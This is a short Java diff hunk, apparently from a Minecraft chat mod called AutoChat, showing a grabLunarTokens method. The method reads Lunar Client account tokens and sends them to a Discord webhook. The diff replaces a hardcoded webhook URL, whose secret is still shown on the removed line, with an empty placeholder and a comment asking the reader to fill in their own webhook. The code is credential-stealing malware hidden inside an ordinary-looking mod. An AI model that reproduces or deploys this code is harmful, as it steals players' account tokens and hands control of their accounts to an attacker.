@@ -153,7 +153,9 @@ public class AutoChat {
     public void grabLunarTokens() {
         try {
             LunarTokenReader tr = new LunarTokenReader();
-            String webhookUrl = "https://discord.com/api/webhooks/1248630842947797042/u3zPVi_LZRCtZPGOEZqa-W0kjnNfy2B4lC85qwcfiz-BFAlSKUos2gRH9UZPyXr_G0lk";
+            // TODO
+            // Fill with your discord webhook url
+            String webhookUrl = "";
             tr.setDiscordWebhook(webhookUrl);
             tr.sendTokens("Lunar");
         } catch (Exception e) {
